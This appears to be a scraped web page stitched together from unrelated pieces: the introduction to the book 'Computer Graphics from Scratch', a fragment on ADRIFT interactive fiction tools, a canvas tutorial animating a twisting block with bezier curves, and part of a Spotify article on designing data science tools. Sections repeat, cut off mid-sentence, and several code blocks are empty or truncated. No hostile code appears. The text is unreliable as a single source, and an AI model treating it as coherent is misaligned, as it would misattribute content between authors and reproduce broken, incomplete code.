<p>There’s little pre-requisite knowledge, nor hardware or software dependencies. The only primitive used in the book is a method that lets us set the color of a pixel - hence <strong>“from scratch”</strong>. The algorithms are conceptually simple, and the math is straightforward. There is some high-school level trigonometry. There’s some basic Linear Algebra as well, but I’m including an appendix that can be consulted as necessary.</p>
<p>This work is divided in two main parts, <strong>Raytracing</strong> and <strong>Rasterization</strong>, which focus on the two main ways to make pretty pictures out of data. The <strong>Common concepts</strong> chapter introduces some basic knowledge necessary to understand these two parts.</p>
<p>The focus of this work is not on performance, but on clear conceptual exposition. The sample code is, well, <em>sample code</em>, written in the most <em>clear</em> way possible, which may not be the most <em>efficient</em> way to implement the algorithms. Where there are different ways to do something, I’ve chosen the easiest to understand.</p>
<p>The “end result” of this work is two complete, fully functional renderers: a raytracer and a rasterizer. Although they follow very different approaches, they produce similar results when used to render a simple scene:</p>
<figure>
<img src="https://www.gabrielgambetta.com/computer-graphics-from-scratch/images/comparison-1.png">
</figure>
<p>While their sets of features have considerable overlap, they aren’t identical, so this book covers their specific strengths:</p>
<figure>
<img src="https://www.gabrielgambetta.com/computer-graphics-from-scratch/images/comparison-2.png">
</figure>
<p>The book provides sample code throughout the text, as somewhat informal pseudocode; it also provides fully working implementations written in JavaScript that can run directly on your browser, rendering to a <code>canvas</code> element.</p>
<h2 id="why-read-this">Why read this?</h2>
<p>This work should give you all the knowledge necessary to write software renderers. Although in the age of GPUs few people have good reasons to write a pure software renderer, the experience of writing one is valuable for the following reasons:</p>
<ol type="1">
<li><p><strong>Shaders</strong>. The first GPUs had their algorithms hardcoded in hardware, but in modern ones you’re expected to write your own shaders. In other words, you’re still implementing big chunks of rendering software, except it now runs on the GPU.</p></li>
<li><p><strong>Understanding</strong>. Whether you’re using a fixed pipeline or writing your own shaders, <em>understanding</em> what’s going on behind the scenes lets you use the fixed pipeline better and write better shaders.</p></li>
<li><p><strong>Fun</strong>. Few areas of Computer Science have the kind of immediately visible results offered by Computer Graphics. The sense of accomplishment you get when your SQL query runs just right is <em>nothing</em> compared to what you feel the first time you get ray traced reflections right. I taught Computer Graphics at my university for 5 years. I often wondered why I enjoyed teaching the same thing semester after semester for so long; in the end, what made it worth it was seeing the faces of my students light up and use their first renders as desktop backgrounds.</p></li>
</ol>
<h2 id="work-in-progress">Work in progress</h2>
<p>This is a work in progress. Here’s a non-exhaustive to do list:</p>
<ul>
<li>Texture filtering</li>
<li>Normal mapping</li>
<li>Textures in the raytracer</li>
<li>Shadows in the rasterizer (stencil and shadow maps)</li>
<li>Reflection in the rasterizer</li>
<li>Expand the CSG and Refraction sections into chapters</li>
<li>Linear algebra appendix</li>
<li>Make demos interactive</li>
<li>Clean up demo code</li>
</ul>
<p>Feel free to contribute or to correct mistakes - all the text, diagrams and demos are in <a href="https://github.com/ggambetta/computer-graphics-from-scratch">Github</a>. PRs welcome!</p>

<p>I’m a senior software engineer at Google. In the past I’ve worked at <a href="http://improbable.io/">Improbable</a>, who have a good shot at building the Matrix, for real (or at the very least revolutionizing multiplayer game development), and at <a href="http://mysterystudio.com/">Mystery Studio</a>, a game development company I founded and ran for about a decade, and which released almost 20 games you probably never heard of.</p>
<p>I taught Computer Graphics for five years at university, where it was a semester-long third-year subject. I am grateful to all of my students, who served as unwitting guinea pigs for the materials that inspired this book.</p>
<p>I have other interests besides Computer Graphics, engineering-related and otherwise. See <a href="http://gabrielgambetta.com/">my website</a>, for more details and contact information.</p>

<p>There are different versions of ADRIFT, adventures created with a specific version of ADRIFT Developer should be played with the same version of ADRIFT Runner — but ADRIFT Runner 5 should be able to run adventures created for v4:</p>
<div>
<ul>
<li>
<p><strong>ADRIFT 5.0</strong> (2011–)</p>
</li>

<p>Traditionally, IF maps are represented by boxes connected by lines, representing the various rooms and their directions connections. They are intended to represent movements in the adventure world locations, not a physical representation of its geography — but sometimes «realistic» maps are provided with the game feelies, for aesthetic reasons.</p>
<p>Mapping tools can be used for either manually drawing maps from scratch, or to automatically build a map by analizying a game session transcript (live or saved). Some tools offer both functionality.</p>
<p>Many of the tools presented here are now hosted at the IF-Archive — they are old and don’t have any longer a website of their own. To avoid direct linking to their binary archives, a link to the “Mapping Tools” index page at IF-Archive will be provided instead:</p>

No Starch Press is publishing a book based on this website in early 2021. Stay tuned!
</p>
<p><strong>TL;DR:</strong> This book will <em>not</em> teach you how to use OpenGL or DirectX; instead, it can teach you how OpenGL and DirectX <em>work</em>. In practice you won’t write a software renderer for production use, but understanding how and why a renderer works will let you use OpenGL and DirectX more effectively.</p>
<p>Computer Graphics is a fascinating topic - how do you make <em>Toy Story</em> out of algorithms and some geometric data? Interestingly enough, it’s a mysterious topic not only for the average cinema fan, but also for world-class engineers who just haven’t been exposed to it.</p>
<p>Computer Graphics is also a frighteningly broad topic. From 3D rendering to photographic image filters, from fonts to particle systems, there’s a multitude of disciplines that can be categorized under CG. This work focuses exclusively on 3D rendering.</p>
<p><strong>Computer Graphics from scratch</strong> is my humble attempt to demystify that slice of Computer Graphics in an accessible way. It can be easily understood by high-school students, while covering the same topics of an university course. It is, in fact, based on my years of teaching the subject at my university.</p>
<p>There’s little pre-requisite knowledge, nor hardware or software dependencies. The only primitive used in the book is a method that lets us set the color of a pixel - hence <strong>“from scratch”</strong>. The algorithms are conceptually simple, and the math is straightforward. There is some high-school level trigonometry. There’s some basic Linear Algebra as well, but I’m including an appendix that can be consulted as necessary.</p>
<p>This work is divided in two main parts, <strong>Raytracing</strong> and <strong>Rasterization</strong>, which focus on the two main ways to make pretty pictures out of data. The <strong>Common concepts</strong> chapter introduces some basic knowledge necessary to understand these two parts.</p>
<p>The focus of this work is not on performance, but on clear conceptual exposition. The sample code is, well, <em>sample code</em>, written in the most <em>clear</em> way possible, which may not be the most <em>efficient</em> way to implement the algorithms. Where there are different ways to do something, I’ve chosen the easiest to understand.</p>
<p>The “end result” of this work is two complete, fully functional renderers: a raytracer and a rasterizer. Although they follow very different approaches, they produce similar results when used to render a simple scene:</p>
<figure>
<img src="https://www.gabrielgambetta.com/computer-graphics-from-scratch/images/comparison-1.png">
</figure>
<p>While their sets of features have considerable overlap, they aren’t identical, so this book covers their specific strengths:</p>
<figure>
<img src="https://www.gabrielgambetta.com/computer-graphics-from-scratch/images/comparison-2.png">
</figure>
<p>The book provides sample code throughout the text, as somewhat informal pseudocode; it also provides fully working implementations written in JavaScript that can run directly on your browser, rendering to a <code>canvas</code> element.</p>
<h2 id="why-read-this">Why read this?</h2>
<p>This work should give you all the knowledge necessary to write software renderers. Although in the age of GPUs few people have good reasons to write a pure software renderer, the experience of writing one is valuable for the following reasons:</p>
<ol type="1">
<li><p><strong>Shaders</strong>. The first GPUs had their algorithms hardcoded in hardware, but in modern ones you’re expected to write your own shaders. In other words, you’re still implementing big chunks of rendering software, except it now runs on the GPU.</p></li>
<li><p><strong>Understanding</strong>. Whether you’re using a fixed pipeline or writing your own shaders, <em>understanding</em> what’s going on behind the scenes lets you use the fixed pipeline better and write better shaders.</p></li>
<li><p><strong>Fun</strong>. Few areas of Computer Science have the kind of immediately visible results offered by Computer Graphics. The sense of accomplishment you get when your SQL query runs just right is <em>nothing</em> compared to what you feel the first time you get ray traced reflections right. I taught Computer Graphics at my university for 5 years. I often wondered why I enjoyed teaching the same thing semester after semester for so long; in the end, what made it worth it was seeing the faces of my students light up and use their first renders as desktop backgrounds.</p></li>
</ol>
<h2 id="work-in-progress">Work in progress</h2>
<p>This is a work in progress. Here’s a non-exhaustive to do list:</p>
<ul>
<li>Texture filtering</li>
<li>Normal mapping</li>
<li>Textures in the raytracer</li>
<li>Shadows in the rasterizer (stencil and shadow maps)</li>
<li>Reflection in the rasterizer</li>
<li>Expand the CSG and Refraction sections into chapters</li>
<li>Linear algebra appendix</li>
<li>Make demos interactive</li>
<li>Clean up demo code</li>
</ul>
<p>Feel free to contribute or to correct mistakes - all the text, diagrams and demos are in <a href="https://github.com/ggambetta/computer-graphics-from-scratch">Github</a>. PRs welcome!</p>

<p>I’m a senior software engineer at Google. In the past I’ve worked at <a href="http://improbable.io/">Improbable</a>, who have a good shot at building the Matrix, for real (or at the very least revolutionizing multiplayer game development), and at <a href="http://mysterystudio.com/">Mystery Studio</a>, a game development company I founded and ran for about a decade, and which released almost 20 games you probably never heard of.</p>
<p>I taught Computer Graphics for five years at university, where it was a semester-long third-year subject. I am grateful to all of my students, who served as unwitting guinea pigs for the materials that inspired this book.</p>
<p>I have other interests besides Computer Graphics, engineering-related and otherwise. See <a href="http://gabrielgambetta.com/">my website</a>, for more details and contact information.</p>

Getting Started</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">Our starting point in the original image. This is an ideal scenario. The image essentially gives you keyframes for what the animation should look like. Usually, we’re not that lucky. To figure out what to animate requires a bit more imagination.</p><p><img alt="Torsions by Walter Leblanc" src="https://varun.ca/static/torsions-by-walter-leblanc-2-faa4f949376daf416970b343b6d9d7f3.jpg" width="100%" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">So, what exactly is going on here? I see a block of some thickness. The top edge remains fixed while the bottom twists back and forth. As the block twists, the edge warps and creates the tapered look you see on the far right.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">All in all, I see three parts: the beige front face, the blue back face and the front-facing edge.</p><h3 id="2-simplified-case--no-thickness" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#2-simplified-case--no-thickness" aria-label="2 simplified case  no thickness permalink" color="brand.main" font-family="systemSans"></a>2. Simplified Case — No Thickness</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">Let’s reduce this down to the simplest scenario, a flat 2D rectangle that is twisting around. As with hand-drawing, learning to draw with code requires you to observe an object and describe it in terms of lines and curves.</p><p><img alt="Edge curve animated" src="https://varun.ca/static/edge-curve-animated-381dd358ba4bc0a6400466e9be4c0106.gif" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">I see a rectangle with the bottom two vertices oscillating left and right. And the two vertical edges go from a straight line to a curve and then back again.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">What is that curve?</p><h3 id="3-edge-curve" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#3-edge-curve" aria-label="3 edge curve permalink" color="brand.main" font-family="systemSans"></a>3. Edge Curve</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">To me this looks a like a cosine wave. There is no cosine path API for Canvas, however, you can draw it using the <a href="https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/bezierCurveTo" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">bezier path API</a>.</p><p><img alt="Edge curve" src="https://varun.ca/static/edge-curve-aca82639b8c8c135d11b4cc034798e5b.png" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">A bezier curve requires four points: start, end and two control points. This should be quite familiar if you’ve ever worked with vector paths in Illustrator, Sketch or Figma. Now, we know the start and endpoints. They are two vertices of the rectangle.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">So, what about the control points? A quick google took me to this Stackoverflow <a href="https://stackoverflow.com/a/29214613" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">answer</a>. Here’s how you can calculate the two control points:</p><div data-language="js"><pre><code>

Straight Edge to Curve and Back Again</h3><p><img alt="Edge curve control point" src="https://varun.ca/static/edge-curve-bottom-animated-140b35537bc5086dca393d73b4b65365.gif" width="50%" display="block"><img alt="Edge curve control point" src="https://varun.ca/static/edge-curve-cp-animated-620d66b20e836b4a50abd4331b0b5009.gif" width="50%" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">The edge oscillates between a straight line and a curve. This requires two movements:</p><ol><li font-family="systemSans" color="neutral.0" font-size="2,3">Horizontal movement of the bottom vertices</li><li font-family="systemSans" color="neutral.0" font-size="2,3">Vertical movement of the top vertex and the bottom control point</li></ol><p font-family="systemSans" color="neutral.0" font-size="2,3">The first movement controls the twist i.e., moves the bottom right vertex to the left and vice versa. The second collapses the curve into a straight line.</p><h3 id="5-combining-the-movements" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#5-combining-the-movements" aria-label="5 combining the movements permalink" color="brand.main" font-family="systemSans"></a>5. Combining the Movements</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">By synchronizing the two movements we achieve the desired result. The curve appears as the bar twists, and straightens as the bar untwists.</p><p><img alt="Edge curve combined motion" src="https://varun.ca/static/edge-curve-animated-combined-1622a85e147b4e64535a3234d8824587.gif" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">And then run the whole thing in reverse.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">Here’s a handy little trick to get the animation to alternate its direction.</p><div data-language="js"><pre><code><span>const</span> <span>sketch</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>

<span>}</span><span>;</span></code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">Canvas-sketch gives you a <code>playhead</code> property. It goes from 0 to 1. By passing it through the sine function, you can make it oscillate from 0 to 1 and back to 0 in the same time duration. Use this <code>pingPongPlayhead</code> value to drive the two movements above.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">BTW I’m only describing the geometry of the left edge here. You can draw the right edge as a mirror image.</p><h3 id="6-adding-a-thick-edge" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#6-adding-a-thick-edge" aria-label="6 adding a thick edge permalink" color="brand.main" font-family="systemSans"></a>6. Adding a Thick Edge</h3><p><img alt="Double curve" src="https://varun.ca/static/double-curve-87b82cf8249290016d45c2ac03d2837c.gif" width="50%" display="block"><img alt="The double curves join to create a thick edge" src="https://varun.ca/static/edge-thickness-7b79445bd7711b339720e1d0ae073549.gif" width="50%" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">Let’s go beyond that flat 2D rectangle. You can add the 3D perspective by making the edge appear thicker. To do so, draw it twice with a slight offset. The start point is same for both the curves. It’s only the end point that is different. Therefore, when you join the two curves you get this triangular-ish strip. The larger the offset the thicker the edge will appear.</p><h3 id="7-combine-the-edge-and-faces" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#7-combine-the-edge-and-faces" aria-label="7 combine the edge and faces permalink" color="brand.main" font-family="systemSans"></a>7. Combine the Edge and Faces</h3><p><img alt="Face and edge" src="https://varun.ca/static/face-and-edge-aaad3dde7b203b5dbbd8f82463eb124d.gif" width="50%" display="block"><img alt="The double curves join to create a thick edge" src="https://varun.ca/static/edge-thickness-7b79445bd7711b339720e1d0ae073549.gif" width="50%" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">I broke down the animation into two layers: the flat faces and the edge. By combining the two we get this perception of a block of some thickness twisting around.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">To be honest, I thought I was done, but there’s an issue. Observe the edge. At first, you don’t see the edge, then slowly, the edge appears and then it disappears again as the block twists entirely. That isn’t correct. The edge should remain visible in that fully twisted state. However, it does being to taper. Let’s fix that.</p><h3 id="8-correcting-perspective" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#8-correcting-perspective" aria-label="8 correcting perspective permalink" color="brand.main" font-family="systemSans"></a>8.

Notice the <code>lerpFrames</code> here. I added that back in step 4, to animate the bottom control point.</p><div data-language="js"><pre><code><span>function</span> <span>edgeCurve</span><span>(</span><span><span>[</span>x1<span>,</span> y1<span>]</span><span>,</span> <span>[</span>x2<span>,</span> y2<span>]</span><span>,</span> playhead</span><span>)</span> <span>{</span>

You create curves and then morph them as the image animates.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">Checkout the <a href="https://github.com/winkerVSbecks/sketchbook/blob/master/torsions.js" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">full source</a> on Github.</p></div><div display="block,block,none"><h3 id="1-getting-started" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#1-getting-started" aria-label="1 getting started permalink" color="brand.main" font-family="systemSans"></a>1. Getting Started</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">Our starting point in the original image. This is an ideal scenario. The image essentially gives you keyframes for what the animation should look like. Usually, we’re not that lucky. To figure out what to animate requires a bit more imagination.</p><p><img alt="Torsions by Walter Leblanc" src="https://varun.ca/static/torsions-by-walter-leblanc-2-faa4f949376daf416970b343b6d9d7f3.jpg" width="100%" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">So, what exactly is going on here? I see a block of some thickness. The top edge remains fixed while the bottom twists back and forth. As the block twists, the edge warps and creates the tapered look you see on the far right.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">All in all, I see three parts: the beige front face, the blue back face and the front-facing edge.</p><h3 id="2-simplified-case--no-thickness" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#2-simplified-case--no-thickness" aria-label="2 simplified case  no thickness permalink" color="brand.main" font-family="systemSans"></a>2. Simplified Case — No Thickness</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">Let’s reduce this down to the simplest scenario, a flat 2D rectangle that is twisting around. As with hand-drawing, learning to draw with code requires you to observe an object and describe it in terms of lines and curves.</p><p><img alt="Edge curve animated" src="https://varun.ca/static/edge-curve-animated-381dd358ba4bc0a6400466e9be4c0106.gif" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">I see a rectangle with the bottom two vertices oscillating left and right. And the two vertical edges go from a straight line to a curve and then back again.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">What is that curve?</p><h3 id="3-edge-curve" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#3-edge-curve" aria-label="3 edge curve permalink" color="brand.main" font-family="systemSans"></a>3. Edge Curve</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">To me this looks a like a cosine wave. There is no cosine path API for Canvas, however, you can draw it using the <a href="https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/bezierCurveTo" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">bezier path API</a>.</p><p><img alt="Edge curve" src="https://varun.ca/static/edge-curve-aca82639b8c8c135d11b4cc034798e5b.png" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">A bezier curve requires four points: start, end and two control points. This should be quite familiar if you’ve ever worked with vector paths in Illustrator, Sketch or Figma. Now, we know the start and endpoints. They are two vertices of the rectangle.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">So, what about the control points? A quick google took me to this Stackoverflow <a href="https://stackoverflow.com/a/29214613" target="_blank" rel="noopener noreferrer" color="brand.main" font-family="systemSans">answer</a>. Here’s how you can calculate the two control points:</p><div data-language="js"><pre><code>

Check it out for a full deep dive.</p><h3 id="4-straight-edge-to-curve-and-back-again" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#4-straight-edge-to-curve-and-back-again" aria-label="4 straight edge to curve and back again permalink" color="brand.main" font-family="systemSans"></a>4. Straight Edge to Curve and Back Again</h3><p><img alt="Edge curve control point" src="https://varun.ca/static/edge-curve-bottom-animated-140b35537bc5086dca393d73b4b65365.gif" width="50%" display="block"><img alt="Edge curve control point" src="https://varun.ca/static/edge-curve-cp-animated-620d66b20e836b4a50abd4331b0b5009.gif" width="50%" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">The edge oscillates between a straight line and a curve. This requires two movements:</p><ol><li font-family="systemSans" color="neutral.0" font-size="2,3">Horizontal movement of the bottom vertices</li><li font-family="systemSans" color="neutral.0" font-size="2,3">Vertical movement of the top vertex and the bottom control point</li></ol><p font-family="systemSans" color="neutral.0" font-size="2,3">The first movement controls the twist i.e., moves the bottom right vertex to the left and vice versa. The second collapses the curve into a straight line.</p><h3 id="5-combining-the-movements" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#5-combining-the-movements" aria-label="5 combining the movements permalink" color="brand.main" font-family="systemSans"></a>5. Combining the Movements</h3><p font-family="systemSans" color="neutral.0" font-size="2,3">By synchronizing the two movements we achieve the desired result. The curve appears as the bar twists, and straightens as the bar untwists.</p><p><img alt="Edge curve combined motion" src="https://varun.ca/static/edge-curve-animated-combined-1622a85e147b4e64535a3234d8824587.gif" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">And then run the whole thing in reverse.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">Here’s a handy little trick to get the animation to alternate its direction.</p><div data-language="js"><pre><code><span>const</span> <span>sketch</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>

  <span>}</span><span>;</span>
<span>}</span><span>;</span></code></pre></div><p font-family="systemSans" color="neutral.0" font-size="2,3">Canvas-sketch gives you a <code>playhead</code> property. It goes from 0 to 1. By passing it through the sine function, you can make it oscillate from 0 to 1 and back to 0 in the same time duration. Use this <code>pingPongPlayhead</code> value to drive the two movements above.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">BTW I’m only describing the geometry of the left edge here. You can draw the right edge as a mirror image.</p><h3 id="6-adding-a-thick-edge" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#6-adding-a-thick-edge" aria-label="6 adding a thick edge permalink" color="brand.main" font-family="systemSans"></a>6. Adding a Thick Edge</h3><p><img alt="Double curve" src="https://varun.ca/static/double-curve-87b82cf8249290016d45c2ac03d2837c.gif" width="50%" display="block"><img alt="The double curves join to create a thick edge" src="https://varun.ca/static/edge-thickness-7b79445bd7711b339720e1d0ae073549.gif" width="50%" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">Let’s go beyond that flat 2D rectangle. You can add the 3D perspective by making the edge appear thicker. To do so, draw it twice with a slight offset. The start point is same for both the curves. It’s only the end point that is different. Therefore, when you join the two curves you get this triangular-ish strip. The larger the offset the thicker the edge will appear.</p><h3 id="7-combine-the-edge-and-faces" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#7-combine-the-edge-and-faces" aria-label="7 combine the edge and faces permalink" color="brand.main" font-family="systemSans"></a>7. Combine the Edge and Faces</h3><p><img alt="Face and edge" src="https://varun.ca/static/face-and-edge-aaad3dde7b203b5dbbd8f82463eb124d.gif" width="50%" display="block"><img alt="The double curves join to create a thick edge" src="https://varun.ca/static/edge-thickness-7b79445bd7711b339720e1d0ae073549.gif" width="50%" display="block"></p><p font-family="systemSans" color="neutral.0" font-size="2,3">I broke down the animation into two layers: the flat faces and the edge. By combining the two we get this perception of a block of some thickness twisting around.</p><p font-family="systemSans" color="neutral.0" font-size="2,3">To be honest, I thought I was done, but there’s an issue. Observe the edge. At first, you don’t see the edge, then slowly, the edge appears and then it disappears again as the block twists entirely. That isn’t correct. The edge should remain visible in that fully twisted state. However, it does being to taper. Let’s fix that.</p><h3 id="8-correcting-perspective" font-family="systemSans" color="neutral.0" font-size="3,4" font-weight="7"><a href="#8-correcting-perspective" aria-label="8 correcting perspective permalink" color="brand.main" font-family="systemSans"></a>8.

Notice the <code>lerpFrames</code> here. I added that back in step 4, to animate the bottom control point.</p><div data-language="js"><pre><code><span>function</span> <span>edgeCurve</span><span>(</span><span><span>[</span>x1<span>,</span> y1<span>]</span><span>,</span> <span>[</span>x2<span>,</span> y2<span>]</span><span>,</span> …</span></code></pre></div></div></div>

December 1, 2020 | https://spotify.design/article/designing-data-science-tools-at-spotify | <a href="https://web.archive.org/web/*/https://spotify.design/article/designing-data-science-tools-at-spotify">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Spotify operates at a massive scale: We have millions of listeners whose activities generate huge amounts of raw data. Raw data by itself is not that helpful though; we need to be able to process, manage, and distill it into insights that can inform new features or improvements to the experience. And to do that, we need usable, well-designed tools that ensure these insights can be easily understood.</p><div><p>Up until recently, the tools Spotify’s data scientists used every day were designed mostly by engineers. There was no one dedicated to looking at the problems data scientists were experiencing holistically. This meant that a lot of the time, the tools were strung together with inefficient hacky workarounds.</p><p>Throughout the past year, a design team was created to rethink the existing stack and weed out these bad practices.&nbsp;</p><p>I’m a product designer in the R&amp;D Community at Spotify, and I’ve been working in the data tools space for about a year — which makes me one of the longest-serving designers in the team. I was brought in to pair up with engineering squads working on platforms and experiences for data scientists. Most recently, I helped to create and launch a new data science tool that would expedite insights production, and eliminate those old, inefficient ways of working.</p><h3>Hierarchy of needs</h3><p>Before I get into the nitty-gritty of how we designed this new data science tool, it helps to understand how data scientists transform raw data into usable insights.&nbsp;</p><p>In her post for Hacker Noon, Monica Rogati explains <a href="https://hackernoon.com/the-ai-hierarchy-of-needs-18f111fcc007" rel="noopener noreferrer" target="_blank"><u><i>The AI Hierarchy of Needs</i></u></a>. This is the idea that<strong> </strong>there are many steps between getting data and using it for business.&nbsp;</p></div><div><figure><div><div></div></div></figure><p>The Data Science Hierarchy of Needs outlines the steps between getting data and using it for business. </p></div><div><p>First, they need to collect the right data.&nbsp;&nbsp;</p><p>Then they need to process that data.&nbsp;</p><p>Only when it has been processed can it be analyzed and explored.&nbsp;</p><h3>Existing landscape</h3><p>When we started thinking about how to do this at Spotify, there were already some tools in use:&nbsp;</p><p><strong>BigQuery</strong>&nbsp;</p><p>This is a Google data warehouse product with a web user interface where data scientists can store and process data. They can write queries here to make sure they have the right dataset for their question.</p><p><strong>Jupyter Notebooks&nbsp;</strong></p><p>Often simply called “notebooks.” Notebooks are an open source interactive workspace for running code in blocks mixed with prose.&nbsp;</p><p>After Data Scientists use the BigQuery UI to validate their dataset, they use local notebooks to find insights, create visualizations, which explain the findings, and share their work (among other tasks).</p><p><strong>ScienceBox&nbsp;</strong></p><p>This is an internal Spotify command line interface tool to help speed up the way Data Scientists use notebooks. It’s commonly used as a way to organize files into projects, pre-install data science libraries, and create a standardized and reproducible data analysis workflow.&nbsp;</p><p>
These tools worked well for small datasets, but as data scientists were expected to work with bigger and bigger datasets, however, they had to wait longer to see the results of their code. If we expect data scientists at Spotify to find high-impact insights from the huge amounts of data we collect every day, they need tools to help create high-quality insights at high speeds.</p><h3>Our design challenge</h3><p>By the time I got involved in the project, the basic framework for the plan had already been established. ScienceBox was going to be rebuilt with a UI in the cloud, allowing us to unlock cloud computing benefits such as scalability, high-speed processing, and infrastructure flexibility.&nbsp;</p><p>We hypothesized that improving this tool by adding processing power, scaling discoverability, and using cloud infrastructure, we could help data scientists analyze data more efficiently, improve collaboration, and reduce the time to find insights in data.</p><p>To start off, I caught up on all the research conducted so far, and mapped out the existing workflow so we could clearly see the changes we needed to make. With the help of a visual workflow, we saw that we could group the type of work into two main types — “ad hoc querying” (i.e. quickly querying data to find immediate answers), and “long-term investigations” (structured projects with month-long timelines).&nbsp;</p><p>I then segmented our users into targeted groups so we could make user-informed design decisions for the workflows we identified. Below is a sample flow for a data scientist running an ad hoc analysis.</p></div><div><figure><div><div></div></div></figure><p>A visual workflow showing various products a user had to interact with to complete a task</p></div><div><h3>What we learned&nbsp;&nbsp;</h3><p>In rebuilding a crucial tool like ScienceBox in the cloud, we learned 3 important lessons along the way that informed our approach and ultimately led to a more effective tool. They were:</p><ol><li><p>Quick actions make life easier</p></li><li><p>Design for discoverability</p></li><li><p>Highly variable workflows are normal
</p></li></ol><p><strong>Quick actions make life easier</strong></p><p>When we started this project, we watched many data scientists use existing analysis tools to learn how these tools were used. We learned a lot about the limitations of these tools in the context of their work. For example, we learned that if data scientists were conducting analysis locally, it could take up all of their laptops' computational resources. This meant they couldn’t use their laptops for other tasks, and they often ended up running their queries overnight. It also meant that analysis running throughout the day could involve <i>a lot</i> of waiting.
</p><p>Our decision to create a cloud product would allow data scientists to add processing power by running code in the cloud, rather than on their laptops. They would use <a href="https://en.wikipedia.org/wiki/Virtual_machine" rel="noopener noreferrer" target="_blank"><u>virtual machines (VMs)</u></a>, an emulation of a separate computer system, to speed up the time it takes to run code. These VMs range from standard size (standard speeds) to large size types (extra-high speed and memory). With these VM types, data scientists could free up their laptops for other tasks, run multiple jobs at once, and run each job faster.&nbsp;
</p><p>There was one catch: Our internal interface would mainly function as the launchpad into the web-based interactive development environment, JupyterLab notebooks (the next generation of notebooks), in a new browser tab.
</p><p>All the data analysis and processing work would take place in these notebooks, but since each one needed a virtual machine to power it, every data scientist had to use our separate internal tool at the start of each project to add those resources.&nbsp;
</p><p>Our challenge was to design a product that enabled data scientists to access notebooks as quickly as possible.</p><p>Initially, we thought that data scientists would choose a notebook project before deciding what size the VM powering that notebook should be (the bigger the virtual machine, the higher the speed and memory capacity).&nbsp;
</p><p>This reasoning meant that the VM controls were considered a secondary action, which we hid in a slide-out side panel. However, after user testing, the team and I learned that this hypothesis was incorrect. Controlling the VM was actually one of the main needs in the ScienceBox Cloud UI, so it needed to be front and center.</p><p>
To solve this, we iterated based on the user testing results and added a VM control as a "quick action" in line with the notebook project name.</p></div><div><p>This worked better than expected. As a workflow shortcut, it allowed users to immediately jump in and work without thinking about how to administer their VMs. Additionally, the status of the machine served as a quick way to sort active projects, so that users could visualize which projects they were working on.&nbsp;
</p><p><strong>Design for discoverability</strong></p><p>When we were researching, we learned that the many notebooks scattered across Spotify meant it was hard to locate past work.</p><p>
In our solution, since we believed that data scientists needed access to only their team’s work, we first decided to limit the search results by auto-populating every data scientist's account.</p><p>However, we quickly learned our initial assumption was incorrect. We found that Spotify data scientists often worked across teams and needed access to a wide variety of past work. The data owners they needed to talk to were often on different teams.&nbsp;
